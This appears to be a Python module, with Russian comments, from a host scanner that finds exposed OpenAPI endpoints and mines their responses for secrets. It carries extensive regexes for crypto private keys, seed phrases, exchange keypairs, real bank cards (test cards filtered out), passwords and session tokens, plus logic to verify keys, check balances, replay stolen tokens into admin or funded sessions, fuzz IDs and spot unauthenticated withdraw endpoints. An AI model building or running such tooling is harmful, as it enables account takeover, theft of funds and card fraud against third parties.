# -*- coding: utf-8 -*-
"""Проверка хоста: OpenAPI discovery + auth check."""
import asyncio
import base64
import json
import re
import ssl
import time
from typing import Any
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor

import aiohttp

from .ai_verify import (
    check_dsn,
    extract_ai_keys,
    extract_aws_keypairs,
    extract_cryptopay_keys,
    extract_dsns,
    extract_exchange_pairs,
    extract_secrets,
    extract_telegram_bots,
    extract_twilio_pairs,
    extract_twitter_bearers,
    extract_twitter_sessions,
    extract_wp_creds,
    extract_integrations,
    extract_crypto_keys,
    extract_facebook_tokens,
    probe_wp_admin,
    probe_wp_sites,
    verify_ai_key,
    verify_aws_keypair,
    verify_cryptopay_key,
    verify_exchange_keypair,
    verify_integration,
    verify_facebook,
    check_key_balance,
    check_login,
    verify_secret,
    verify_telegram_bot,
    verify_twilio_pair,
    verify_twitter_bearer,
    verify_twitter_session,
    verify_wp_creds,
)
from .config import Settings
from .models import HostRow, CheckResult


# Пути для поиска OpenAPI
# Money rule: пути вывода средств (только POST — GET-история не считается)
WITHDRAW_PATH_RE = re.compile(r'(?:withdraw|withdrawal|payout|cash_?out)', re.I)

# Money rule: адрес кошелька ценен только в денежном контексте.
# Гейт: эндпоинт с профильным названием ИЛИ в том же ответе есть
# ключи/платёжные секреты → wallet_address_money (HIGH).
WALLET_MONEY_PATH_RE = re.compile(
    r'(?:wallet|payout|withdraw|cash_?out|balance|treasury|billing|deposit|funds)',
    re.I,
)
WALLET_MONEY_CO_PATTERNS = {
    # ключевой материал
    "private_key_pem", "evm_private_key", "bitcoin_wif", "solana_key",
    "solana_keypair", "seed_phrase", "extended_key", "keystore_json",
    "private_key_generic",
    # платёжные API
    "cryptopay_key", "exchange_keypair",
}


def gate_wallet_money(patterns: list[str], path: str) -> bool:
    """True, если адрес кошелька найден в денежном контексте.

    Сам по себе адрес — публичная информация (MEDIUM): большинство
    находок — payout-адреса пользователей. HIGH даём, когда эндпоинт
    называется по-денежному (wallet/balance/payout/...) или в том же
    ответе есть ключи/платёжные секреты.
    """
    if "wallet_address" not in patterns:
        return False
    return bool(
        WALLET_MONEY_PATH_RE.search(path)
        or WALLET_MONEY_CO_PATTERNS.intersection(patterns)
    )


# Пассивная классификация withdraw-эндпоинта по уже записанному ответу
# (без повторных опасных запросов)
WITHDRAW_AUTH_RE = re.compile(
    r'(authentication required|missing session|unauthorized|permission denied'
    r'|认证失败|인증|please login|token required)',
    re.I,
)
WITHDRAW_VALIDATION_RE = re.compile(
    r'(is required|are required|must be provided|validation|expecting value|invalid request)',
    re.I,
)
# Валидация заголовков (deviceid/deviceType и т.п.): запрос не дошёл
# до auth-слоя, открытость эндпоинта не подтверждена (DarvionPay-кейс)
WITHDRAW_HEADERS_RE = re.compile(
    r'(missingheaders|missing headers|deviceid|devicetype'
    r'|must include [^"]{0,40}headers)',
    re.I,
)
WITHDRAW_NOISE_RE = re.compile(
    r'(<!doctype|<html|application is running|website is not available'
    r'|ошибка 404|not found)',
    re.I,
)
WITHDRAW_CLASS_SEVERITY = {
    "": "CRITICAL",
    "withdraw_open": "CRITICAL",       # дошли до бизнес-валидации без auth
    "withdraw_processed": "CRITICAL", # запрос обработан успешно
    "withdraw_protected": "HIGH",     # auth реально требуется
    "withdraw_headers": "HIGH",        # не дошли до auth - нужны заголовки
    "withdraw_noise": "MEDIUM",       # HTML-заглушка/мусор вместо API
}


def classify_withdraw_response(body: str) -> str:
    """Классификация withdraw-эндпоинта по уже полученному ответу.

    Пассивно - повторные POST на вывод опасны, используем записанный ответ.
    """
    b = body[:5000]
    if WITHDRAW_AUTH_RE.search(b):
        return "withdraw_protected"
    if WITHDRAW_NOISE_RE.search(b):
        return "withdraw_noise"
    if WITHDRAW_HEADERS_RE.search(b):
        return "withdraw_headers"
    if WITHDRAW_VALIDATION_RE.search(b):
        return "withdraw_open"
    if re.search(r'"success"\s*:\s*true|"status"\s*:\s*"?(ok|success)', b, re.I) \
            or b.strip().lower() in ("success", "ok"):
        return "withdraw_processed"
    return ""

OPENAPI_PATHS = [
    "/openapi.json",
    "/swagger.json",
    "/api/openapi.json",
    "/v1/openapi.json",
    "/v2/openapi.json",
    "/v3/openapi.json",
    "/api-docs",
    "/v3/api-docs",
    "/v2/api-docs",
    "/swagger/v1/swagger.json",
    "/docs/openapi.json",
    "/rest/openapi.json",
    "/service/openapi.json",
]

# Паттерны чувствительных данных (из prototype/auth_checker/crypto_detect.py)
SENSITIVE_PATTERNS = {
    # CRITICAL - прямые деньги
    "password": re.compile(r'"(?:password|passwd|email_password|user_password)"\s*:\s*"([^"]{3,})"', re.I),
    # PEM с реальным телом: 40+ base64 сразу за заголовком. Плейсхолдер
    # "-----BEGIN...\n...\n-----END" (LiteLLM /public/providers/fields) не матчится
    "private_key_pem": re.compile(
        r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----\s*[A-Za-z0-9+/]{40,}'),
    # Чекер-листы: логин/email/телефон + пароль в одном объекте (оба порядка).
    # Голый password - шум (wifi/IoT), пара = живые аккаунты
    "account_pair": re.compile(
        r'"(?:email|login|username|admin_email|user_email|account|phone|admin_username)"\s*:\s*"[^"]{3,80}"'
        r'[^{}]{0,200}?"(?:password|admin_password|pwd|pass)"\s*:\s*"[^"]{4,}"'
        r'|"password"\s*:\s*"[^"]{4,}"[^{}]{0,200}?"(?:email|login|username|admin_email|user_email|account|phone|admin_username)"\s*:\s*"[^"]{3,80}"',
        re.I),
    # Мультиформат-секреты (JSON-тела покрывают паттерны выше):
    # env/properties (PASSWORD=x), YAML (password: x), XML/SOAP
    # (<password>x</password>). ^-привязка строк исключает дубли с JSON
    "password_any": re.compile(
        r'(?mi)^[ \t]*[A-Z0-9_]{0,24}(?:PASSWORD|PASSWD|PWD|PASS)[A-Z0-9_]{0,16}='
        r'(?:["\'][^\'"\n]{3,120}["\']|[^#\s\n][^#\n]{2,119})[ \t]*(?:#|$)'
        r'|^[ \t]*[a-z0-9_]{0,24}(?:password|passwd|pwd)[a-z0-9_]{0,16}[ \t]*:[ \t]*'
        r'(?:["\'][^\'\n]{3,120}["\']|[^#\s\n][^#\n]{2,119})[ \t]*(?:#|$)'
        r'|<(?:password|passwd|pwd|admin[_-]?password|user[_-]?password|smtp[_-]?pass)'
        r'[^>]{0,24}>(?:<!\[CDATA\[)?([^<\s\n][^<\n]{2,120})(?:\]\]>)?</'),
    "api_key_any": re.compile(
        r'(?mi)^[ \t]*[A-Z0-9_]{0,24}(?:API_?KEY|APIKEY|SECRET_?KEY|ACCESS_?KEY)[A-Z0-9_]{0,16}='
        r'(?:["\'][^\'"\n]{6,120}["\']|[^#\s\n][^#\n]{5,119})[ \t]*(?:#|$)'
        r'|^[ \t]*[a-z0-9_]{0,24}(?:api_?key|apikey|secret_?key)[a-z0-9_]{0,16}[ \t]*:[ \t]*'
        r'(?:["\'][^\'\n]{6,120}["\']|[^#\s\n][^#\n]{5,119})[ \t]*(?:#|$)'
        r'|<(?:api_?key|apikey|secret[_-]?key)[^>]{0,24}>'
        r'(?:<!\[CDATA\[)?([^<\s\n][^<\n]{5,120})(?:\]\]>)?</'),
    # EVM/Tron private key: 64 hex (0x или без) в поле приватного ключа.
    # Широкий охват имён: private_key, PRIVATE_KEY, privateKey, evm_private_key,
    # walletPrivateKey, tron_private_key, owner_key, signer_key, deployer_key,
    # keeper_key, hot_wallet_key, pk — без привязки к регистру
    "evm_private_key": re.compile(
        r'"(?:[^"]{0,32}(?:priv|wallet|owner|signer|evm|eth|tron|deployer|keeper|hot|funder)[^"]{0,24}key|pk)"'
        r'\s*:\s*"(?:0x)?[0-9a-fA-F]{64}"', re.I),
    # Bitcoin WIF (base58, 5/K/L): поле с wif/priv в имени
    "bitcoin_wif": re.compile(
        r'"[^"]{0,24}(?:wif|priv)[^"]{0,20}"\s*:\s*"[5KL][1-9A-HJ-NP-Za-km-z]{50,51}"', re.I),
    "extended_key": re.compile(r'\b(xprv|yprv|zprv|tprv)[1-9A-HJ-NP-Za-km-z]{50,}\b'),
    # Solana secret key: base58 87-88 символов в поле priv/secret/solana/wallet+key
    "solana_key": re.compile(
        r'"[^"]{0,32}(?:priv|secret|solana|wallet)[^"]{0,24}key"\s*:\s*"[1-9A-HJ-NP-Za-km-z]{87,88}"',
        re.I),
    # Solana keypair: байтовый массив из 64 чисел (формат solana CLI/Phantom);
    # контекст кошелька проверяется в classify_response
    "solana_keypair": re.compile(
        r'\[\s*(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\s*,\s*){63}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\s*\]'),
    # seed_phrase: 12+ слов (BIP-39), поле с seed/mnemonic/recovery/backup в имени
    "seed_phrase": re.compile(
        r'"[^"]{0,24}(?:seed|mnemonic|recovery|backup)[^"]{0,24}"\s*:\s*"([a-z]+(?:\s+[a-z]+){11,})"',
        re.I),
    # secret_key: hex формат 32+ символов
    "secret_key": re.compile(r'"(?:secret_key|master_key|secretKey)"\s*:\s*"[0-9a-fA-F]{32,}"'),
    # otp_secret: base32 формат (A-Z, 2-7)
    "otp_secret": re.compile(r'"(?:otp_secret|totp_secret)"\s*:\s*"[A-Z2-7]{16,}"'),
    "stripe_live": re.compile(r'sk_live_[0-9a-zA-Z]{24,}'),
    "stripe_restricted": re.compile(r'rk_live_[0-9a-zA-Z]{24,}'),
    # Банковская карта: 13-19 цифр (можно с пробелами/дефисами) в card/pan-поле;
    # Luhn + отсев тестовых карт делается в classify_response
    "card_number": re.compile(
        r'"[^"]{0,24}(?:card|pan)[^"]{0,16}"\s*:\s*"?([0-9][0-9 -]{12,21})"?', re.I),
    # Крипто-платёжные процессоры с выплатами: ключ рядом с названием сервиса
    # или сервис прямо в имени поля (nowpayments_api_key)
    "cryptopay_key": re.compile(
        r'(?i)(?:"(?:heleket|cryptomus|nowpayments|plisio)[_-][a-z0-9_-]{0,20}(?:api[_-]?key|apikey)"\s*:\s*"[A-Za-z0-9_-]{20,}"'
        r'|\b(?:heleket|cryptomus|nowpayments|plisio)(?![a-z0-9])[\s\S]{0,200}"[a-z0-9_-]{0,24}(?:api[_-]?key|apikey)"\s*:\s*"[A-Za-z0-9_-]{20,}")'),
    # Twitter/X сессия: пара auth_token+ct0 (cookies аккаунта, полный доступ);
    # значения могут быть полными hex или маскированными "xxxx...xxxx"
    "twitter_session": re.compile(
        r'"auth_token"\s*:\s*"[0-9a-fA-F.]{8,170}"[^{}]{0,250}"ct0"\s*:\s*"[0-9a-fA-F.]{8,170}"'
        r'|"ct0"\s*:\s*"[0-9a-fA-F.]{8,170}"[^{}]{0,250}"auth_token"\s*:\s*"[0-9a-fA-F.]{8,170}"', re.I),
    # Money rule: разрешение вывода средств в конфиге/ответе
    "withdraw_flag": re.compile(r'"(?:can_withdraw|withdraw_enabled|withdrawal_enabled|allow_withdraw)"\s*:\s*"?(?:true|1)"?'),

    # HIGH - доступ к системам
    "facebook_access_token": re.compile(r'"(?:access_token|page_access_token)"\s*:\s*"(EAA[A-Za-z0-9]{50,})"'),
    "github_token": re.compile(r'gh[ps]_[A-Za-z0-9]{36,}'),
    "gitlab_token": re.compile(r'glpat-[A-Za-z0-9\-]{20,}'),
    "telegram_bot": re.compile(r'(?<!\d)\d{8,10}:[A-Za-z0-9_-]{35}(?![A-Za-z0-9_-])'),
    "slack_token": re.compile(r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}'),
    "discord_token": re.compile(r'\b[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{25,}\b'),
    "discord_webhook": re.compile(r'https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+'),
    "sendgrid_key": re.compile(r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'),
    "twilio_key": re.compile(r'SK[0-9a-fA-F]{32}'),
    "exchange_secret": re.compile(r'"(?:api_secret|apiSecret)"\s*:\s*"[A-Za-z0-9]{64}"'),
    # HIGH - auth tokens
    "refresh_token": re.compile(r'"refresh_token"\s*:\s*"[^"]{16,}"', re.I),
    "auth_token": re.compile(r'"auth_token"\s*:\s*"[^"]{16,}"', re.I),
    "bearer_token": re.compile(r'"bearer"\s*:\s*"[^"]{16,}"', re.I),
    "jwt_token": re.compile(r'"jwt"\s*:\s*"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"'),
    # HIGH - AWS. ASIA = временные STS-креды (без session_token не верифицируются)
    "aws_access_key": re.compile(r'\b(?:AKIA|ASIA)[0-9A-Z]{16}\b'),
    "aws_secret_key": re.compile(
        r'"(?:aws_secret_access_key|secret_access_key|aws_secret_key|secret_key|aws_secret)"\s*:\s*"[A-Za-z0-9/+=]{40}"', re.I),
    "aws_session_token": re.compile(r'"aws_session_token"\s*:\s*"[A-Za-z0-9/+=]{20,}"', re.I),
    # HIGH - Exchange
    "binance_key": re.compile(r'"(?:api_key|apiKey)"\s*:\s*"[A-Za-z0-9]{64}"'),
    # AI/SaaS API-ключи: уникальные префиксы провайдеров + generic api_key поля.
    # Generic часть требует цифру в значении (отсеиваем placeholder'ы вида "your_api_key")
    # и исключает ровно 64 alnum (их ловит binance_key) - дублей нет.
    "ai_apikey": re.compile(
        # специфичные префиксы + bare sk- (только с заглавной внутри: URL-слаги
        # вида sk-dau-mui-han... шумят) + deepseek 32hex
        r'(?:\b(?:sk-(?:proj|svcacct)-|sk-ant-|sk-or-v1-|gsk_|pplx-|hf_|xai-|r8_|fw_)[A-Za-z0-9_-]{20,}'
        r'|\bsk-[0-9a-f]{32}\b'
        r'|\bsk-(?=[A-Za-z0-9_-]{20,})(?=[A-Za-z0-9_-]*(?-i:[A-Z]))[A-Za-z0-9_-]{20,}'
        r'|\by0_[A-Za-z0-9_-]{20,}'  # Yandex OAuth (Директ/Метрика)
        r'|"(?:api_key|apiKey|api_token|consumer_key|client_secret)"\s*:\s*"'
        r'(?![A-Za-z0-9]{64}")'  # ровно 64 alnum ловит binance_key
        r'(?![0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")'  # UUID - это id, не ключ
        r'(?![ps]k_(?:live|test)_)'  # Stripe ключи ловит stripe_live
        r'(?=[A-Za-z0-9_-]*\d)[A-Za-z0-9_-]{20,}")',
        re.I),
    # Деньги: связка api_key+api_secret одной биржи - полный доступ к выводу.
    # Между полями могут быть другие поля (client_id и т.п.), но не вложенные объекты
    "exchange_keypair": re.compile(
        r'"(?:api_key|apiKey)"\s*:\s*"[^"]{16,}"[^{}]{0,200}?"(?:api_secret|apiSecret|secret_key|secretKey)"\s*:\s*"[^"]{8,}"'),
    # Вход в админку/аккаунт: креды прямо в Authorization
    "basic_auth": re.compile(r'"authorization"\s*:\s*"Basic\s+[A-Za-z0-9+/]{16,}={0,2}"', re.I),
    "reset_token": re.compile(r'"(?:reset_password_token|reset_token|password_reset_token)"\s*:\s*"[^"]{8,}"', re.I),
    # Обход 2FA: backup/recovery коды
    "two_fa_backup": re.compile(r'"(?:two_factor_backup|backup_codes|recovery_codes)"\s*:\s*(?:"[A-Za-z0-9_-]{6,}"|\[\s*")', re.I),
    # Ответ подтверждает что учётка - админская
    "admin_flag": re.compile(r'"(?:is_admin|super_admin|is_superuser)"\s*:\s*(?:true|1)\b', re.I),
    # Крипта: Ethereum UTC keystore (расшифровывается паролем)
    "keystore_json": re.compile(r'"cipher"\s*:\s*"?aes-', re.I),
    # HIGH - SMTP/DB credentials
    "smtp_password": re.compile(r'"(?:smtp_pass|smtp_password)"\s*:\s*"[^"]{4,}"', re.I),
    "credential": re.compile(r'"(?:credential|credentials)"\s*:\s*"[^"]{8,}"', re.I),
    # HIGH - generic access_token (not Facebook-specific)
    "access_token": re.compile(r'"access_token"\s*:\s*"[^"]{20,}"', re.I),
    # HIGH - API keys with strict patterns
    "google_api_key": re.compile(r'AIza[0-9A-Za-z_-]{35}'),
    "openai_key": re.compile(r'sk-[A-Za-z0-9]{48,}'),
    "mailgun_key": re.compile(r'key-[0-9a-f]{32}'),
    "npm_token": re.compile(r'npm_[A-Za-z0-9]{36}'),
    "pypi_token": re.compile(r'pypi-[A-Za-z0-9_-]{80,}'),
    "shopify_key": re.compile(r'shpat_[a-fA-F0-9]{32}'),
    "dropbox_token": re.compile(r'sl\.[A-Za-z0-9_-]{130,}'),

    # MEDIUM - DSN с credentials (требуют user:pass@)
    "postgres_dsn": re.compile(r'postgres(?:ql)?://[^\s"]+:[^\s"]+@[^\s"]+'),
    "mysql_dsn": re.compile(r'mysql://[^\s"]+:[^\s"]+@[^\s"]+'),
    "mongodb_dsn": re.compile(r'mongodb(?:\+srv)?://[^\s"]+:[^\s"]+@[^\s"]+'),
    "redis_dsn": re.compile(r'redis://[^\s"]+:[^\s"]+@[^\s"]+'),
    "amqp_dsn": re.compile(r'amqp://[^\s"]+:[^\s"]+@[^\s"]+'),
    "smtp_dsn": re.compile(r'smtp://[^\s"]+:[^\s"]+@[^\s"]+'),

    # MEDIUM - session tokens
    "session_id": re.compile(r'"session_id"\s*:\s*"[^"]{8,}"', re.I),
    "session_token": re.compile(r'"session_token"\s*:\s*"[^"]{8,}"', re.I),

    # TEST - проверить и удалить ненужные
    "admin_password": re.compile(r'"admin_password"\s*:\s*"[^"]{3,}"', re.I),
    # WordPress админ-креды в API-ответах (см. extract_wp_creds для пар).
    # user_login/application_password не ловим - поля мусорных доступов, шум.
    "wp_user": re.compile(r'"wp_user(?:name)?"\s*:\s*"[^"]{1,80}"', re.I),
    "wp_password": re.compile(r'"(?:wp_password|wp_pass)"\s*:\s*"[^"]{4,}"', re.I),
    # голый auth_key ловит чужие системы (RADIUS /health) - только WP-специфичные
    "wp_auth_key": re.compile(r'"(?:secure_auth_key|logged_in_key|nonce_key)"\s*:\s*"[^"]{16,}"', re.I),
    "wp_salt": re.compile(r'"(?:auth_salt|secure_auth_salt|logged_in_salt|nonce_salt)"\s*:\s*"[^"]{16,}"', re.I),
    "db_password": re.compile(r'"(?:db_password|DB_PASSWORD)"\s*:\s*"[^"]{3,}"'),

    # Crypto wallets and keys
    "wallet_address": re.compile(r'"(?:wallet_address|wallet|address)"\s*:\s*"(?:0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|[1-9A-HJ-NP-Za-km-z]{32,44})"'),
    # Любое приватное значение в приватном поле (base64/b58/строки) — широкий охват.
    # Левая граница альтернации = anti-"m-eth-odology" (перед eth в method всегда m);
    # (?<!pub)key = pubkey не приватный; UUID/маски-значения пропускаем
    "private_key_generic": re.compile(
        r'"(?:[^"]{0,32}(?<![a-z0-9])(?:priv|wallet|evm|eth|tron|signer|keeper)[^"]{0,24}(?<!pub)key|privateKey)"'
        r'\s*:\s*"(?![0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})'
        r'(?!\*{3,})[^"]{20,}"',
        re.I),
}

# Маскированные значения (игнорируем)
MASKED_VALUES = {"*", "**", "***", "****", "*****", "******", "********"}

# Placeholder хосты в DSN (примеры из документации)
PLACEHOLDER_HOSTS = {
    "host", "hostname", "localhost", "127.0.0.1",
    "example.com", "example.org", "your-host", "your-server",
    "db-host", "database-host", "server", "dbserver",
}


# Банковские карты: Luhn + отсев известных тестовых номеров
CARD_TEST_BIN_PREFIXES = {
    "411111", "424242", "400000", "550000", "601111", "378282", "371449",
    "222300", "555555", "510510", "401288", "378734", "601100",
}


def luhn_ok(digits: str) -> bool:
    total = 0
    for i, ch in enumerate(reversed(digits)):
        d = int(ch)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


def is_test_card(digits: str) -> bool:
    return len(set(digits)) == 1 or digits[:6] in CARD_TEST_BIN_PREFIXES


# AWS example keys (из документации)
AWS_EXAMPLE_KEYS = {
    "AKIAIOSFODNN7EXAMPLE",
    "AKIAI44QH8DHBEXAMPLE",
    "AKIAEXAMPLEKEY",
}

# Placeholder значения (когда значение = название поля)
PLACEHOLDER_VALUES = {    "password", "passwd", "secret", "token", "key", "api_key", "apikey",
    "email", "username", "user", "login", "string", "your_password",
    "your_token", "your_key", "your_secret", "enter_password", "test",
    "example", "sample", "demo", "placeholder", "changeme", "change_me",
    "redacted", "hidden", "removed",
}

# Явный мусор: /demo /guest (и варианты demo-credentials, guest-login, /demo/) —
# демо-креды и guest-онбординг выдаются приложением по дизайну, это не утечки.
# Разделители по краям отсекают случайные вхождения (например /demographics).
DEMO_GUEST_PATH_RE = re.compile(r'(?:^|[/._-])(?:demo|guests?)(?:$|[/._-])', re.I)
# is_admin в ответе: путь /admin/* = админ-зона; токен рядом = выдан вход
ADMIN_PATH_RE = re.compile(r'admin', re.I)
ADMIN_TOKEN_RE = re.compile(r'"(?:access_?token|auth_?token|token)"\s*:\s*"[^"]{8,}"', re.I)


def is_placeholder_value(field: str, value: str) -> bool:
    """Проверяет что значение - placeholder (совпадает с именем поля или типичный пример)."""
    val_lower = value.lower().strip()
    field_lower = field.lower().replace("_", "").replace("-", "")
    # Значение совпадает с полем: "password": "Password"
    if val_lower == field_lower or val_lower.replace("_", "") == field_lower:
        return True
    # Типичные placeholder значения
    if val_lower in PLACEHOLDER_VALUES:
        return True
    # Подстановки окружения: ${VAR}, $VAR, {{VAR}} — значение лежит в конфиге
    if INTERPOLATED_RE.match(val_lower):
        return True
    return False


def is_aws_example_key(key: str) -> bool:
    """Проверяет что AWS ключ - пример из документации или мусор (блобы/заполнители)."""
    if key in AWS_EXAMPLE_KEYS or "EXAMPLE" in key.upper():
        return True
    # Низкая энтропия: AKIAAAAUAAAAAAAAAAAA (base64-блобы, заполнители)
    return len(set(key[4:])) < 4


def is_placeholder_dsn(dsn: str) -> bool:
    """Проверяет что DSN - placeholder/пример/шаблон/маска."""
    lower = dsn.lower()
    # user:pass@host - явный пример
    if "user:pass@" in lower or "username:password@" in lower:
        return True
    # Шаблонные значения конфигураций {{config...}}
    if "{{" in dsn or "}}" in dsn:
        return True
    # Замаскированный пароль (**** / ...)
    if "://" in dsn:
        creds = dsn.split("://", 1)[1].split("@", 1)[0]
        if ":" in creds:
            pw = creds.rsplit(":", 1)[1]
            if pw and set(pw) <= {"*", ".", "-"}:
                return True
    # Проверяем хост после @
    if "@" in lower:
        host_part = lower.split("@")[1].split("/")[0].split(":")[0]
        if host_part in PLACEHOLDER_HOSTS:
            # localhost с реальными кредами - не placeholder:
            # это креды БД самой цели, проверим на её публичном IP
            if host_part in ("localhost", "127.0.0.1") and "://" in dsn:
                creds = dsn.split("://", 1)[1].split("@", 1)[0]
                user, _, pw = creds.partition(":")
                if user and pw and pw.lower() not in PLACEHOLDER_VALUES and not is_masked_value(pw):
                    return False
            return True
    return False


def is_masked_value(value: str) -> bool:
    """Проверяет что значение маскировано или помечено санитизацией.

    Кроме чистых звёздных масок ловит метки вида [redacted] и ***HIDDEN***:
    обрезаем маскирующие символы и скобки, остаток сверяем с маркерами.
    """
    if value in MASKED_VALUES or set(value) <= {"*", ".", "-"}:
        return True
    core = value.strip(" *.-_[]").lower()
    return core in ("redacted", "hidden", "removed")


# Хеш пароля (не plaintext - требует взлома, не деньги сразу):
# {bcrypt}$..., bcrypt$..., $2a$10$... (raw bcrypt), $argon2id$..., $pbkdf2..., $scrypt...
HASHED_PASSWORD_RE = re.compile(
    r'^(?:\{?(?:bcrypt|argon2|pbkdf2|scrypt)\}?[$:0-9]'
    r'|\$2[abxy]?\$\d+\$'
    r'|\$9\$'
    r'|\$6\$'
    r'|\$argon2[id]{0,2}\$'
    r'|\$pbkdf2'
    r'|\$scrypt)',
    re.I,
)
# hex-хеши md5/sha1/sha256 в поле password
HEX_HASH_RE = re.compile(r'^[0-9a-fA-F]{32}$|^[0-9a-fA-F]{40}$|^[0-9a-fA-F]{64}$')
# закодированный блоб (base64 >= 100 символов) вместо пароля
ENCODED_BLOB_RE = re.compile(r'^[A-Za-z0-9+/=_-]{100,}$')
# Дата вида 2026-10-17
DATE_VALUE_RE = re.compile(r'^\d{4}-\d{2}-\d{2}$')
# UUID (анонимные сессии/аналитика выдают UUID в session_id — это не утечка)
UUID_VALUE_RE = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.I)
# Подстановки окружения: "${REDIS_PASSWORD}", "$DB_PASS", "{{secret_key}}" —
# в ответе лежит шаблон, а не значение
INTERPOLATED_RE = re.compile(r'^(?:\$\{[^}]{1,128}\}|\$[A-Za-z_][A-Za-z0-9_]{0,127}|\{\{[^}]{1,128}\}\})$')
# id-fuzz: пары "поле": значение из тел. Собираются значения полей,
# чьи имена похожи на подстановочные параметры (id/slug/username/email/...)
FUZZ_PAIR_RE = re.compile(r'"([A-Za-z_][A-Za-z0-9_]{0,64})"\s*:\s*"?([^",\[\]{}]{1,120})"?', re.I)
# word-part'ы имён полей. Пул расширен (2026-10-21): + account/user/name/
# phone/msisdn/mobile/order/customer/client/merchant/product/item/no
FUZZ_FIELD_RE = re.compile(
    r'(?:^|_)(?:ids?|uuids?|guid|slug|username|user_login|login|email|code|sku|number'
    r'|account|user|name|phone|msisdn|mobile|order|customer|client|merchant'
    r'|product|item|no)s?$', re.I)
# синонимы поле↔параметр: бакет fld кормит не только одноимённый параметр,
# но и синонимы (account -> {id}, user -> {username}/{name}, phone -> {msisdn})
FUZZ_SYNONYMS: dict[str, tuple[str, ...]] = {
    "id": ("account", "user", "number", "no", "code"),
    "account": ("id", "user", "username"),
    "user": ("id", "account", "username", "login", "name"),
    "username": ("user", "login", "name", "email", "account"),
    "name": ("username", "login", "user"),
    "login": ("username", "user", "name", "email"),
    "email": ("username", "login", "user"),
    "phone": ("msisdn", "mobile", "number"),
    "msisdn": ("phone", "mobile", "number"),
    "mobile": ("phone", "msisdn", "number"),
    "number": ("phone", "msisdn", "order", "no"),
    "order": ("order_no", "number", "no", "code"),
    "order_no": ("order", "number", "no"),
    "customer": ("user", "client", "account", "id"),
    "client": ("user", "customer", "account", "id"),
    "merchant": ("customer", "client", "user"),
    "product": ("item", "sku", "code", "id"),
    "item": ("product", "sku", "id"),
    "sku": ("product", "item", "code"),
    "uuid": ("guid", "id"),
    "guid": ("uuid", "id"),
    "slug": ("code", "name", "id"),
    "code": ("sku", "number", "no", "slug", "order"),
}
# token replay: access_token из 200-тел (напр. GET /api/efi/_debug/authorize)
# подставляется в protected GET (401/403) как Authorization: Bearer
TOKEN_RE_RE = re.compile(r'"(?:access_token|accessToken)"\s*:\s*"([^"\s]{16,512})"')
# replay открыл админскую сессию: роль админа/суперюзера (строка или в
# массиве roles) или /admin/* путь
REPLAY_ADMIN_RE = re.compile(
    r'"(?:role|user_role|roles?)"\s*:\s*"?(?:admin|superadmin|super_admin|superuser|administrator)"?'
    r'|"(?:role|user_role|roles)"\s*:\s*\[[^\]]{0,120}?(?:admin|superadmin|super_admin|superuser)'
    r'|"(?:is_admin|is_superuser|is_super_admin)"\s*:\s*(?:true|1)\b', re.I)
# replay открыл сессию с деньгами: credits/balance > 0
REPLAY_MONEY_RE = re.compile(
    r'"(?:credits?|balance|credit_balance|available_credits?|wallet_balance|points)"'
    r'\s*:\s*"?([0-9]+(?:\.[0-9]+)?)"?', re.I)
# личность открытой сессии (name/email/username из /me-ответов)
REPLAY_ID_RE = re.compile(
    r'"(?:name|email|username|user_name|login)"\s*:\s*"([^"@]{3,80})"', re.I)


def _fuzz_candidates(param: str, buckets: dict, cap: int) -> list[str]:
    """Значения бакетов для параметра шаблона: exact/суффикс/префикс
    (user_id -> user) + синонимы (account -> {id}, user -> {username})."""
    p = param.lower()
    out: list[str] = []
    for fld in sorted(buckets):
        syn = FUZZ_SYNONYMS.get(fld, ())
        if not (fld == p or fld.endswith("_" + p) or p.endswith("_" + fld) or p in syn):
            continue
        for v in sorted(buckets[fld])[: cap]:
            if v not in out:
                out.append(v)
        if len(out) >= cap:
            break
    return out[: cap]


def _fuzz_value_variants(val: str) -> list[str]:
    """Похожие значения - не 1-в-1, но могут бить в параметр:
    digits-выжимка (ORD2026...A3DA -> 20260513...), email local part,
    uuid без дефисов, нижний регистр, соседи id N -> N-1/N+1."""
    out: list[str] = []
    v = val.strip()
    if not v or len(v) > 64:
        return out
    if v.lower() != v:
        out.append(v.lower())
    if "@" in v:
        loc = v.split("@", 1)[0]
        if 2 <= len(loc) < len(v):
            out.append(loc)
    if len(v) == 36 and v.count("-") == 4:
        out.append(v.replace("-", ""))
    digits = re.sub(r"\D", "", v)
    if 3 <= len(digits) <= 20 and digits != v:
        out.append(digits)
    if v.isdigit() and 1 < len(v) <= 10:
        n = int(v)
        if n > 1:
            out.append(str(n - 1))
        out.append(str(n + 1))
    return out
# id'шники в JSON-телах (для id-fuzz: подставляются в GET-шаблоны с {param})


# --- replay-входы (фаза 3): cookie-сессии, креды (пары + Basic), api-keys ---
REPLAY_SESSION_RE = re.compile(
    r'"(session_id|session_token|sessionid|session|sid|jsessionid|phpsessid)"'
    r'\s*:\s*"([A-Za-z0-9_.:\-]{8,120})"', re.I)
# пара логин+пароль в одном объекте (для cred-replay и login-проверки);
# формы account_pair, значение пароля - реальное (не hash/masked/placeholder)
REPLAY_PAIR_RE = re.compile(
    r'"(?:username|login|email|admin_username|account)"\s*:\s*"([^"@\\][^"]{1,80})"'
    r'[^{}]{0,200}?"(?:password|admin_password|pwd|pass)"\s*:\s*"([^"]{4,})"', re.I)
REPLAY_BASIC_RE = re.compile(r'"authorization"\s*:\s*"Basic\s+([A-Za-z0-9+/]{8,}={0,2})"', re.I)
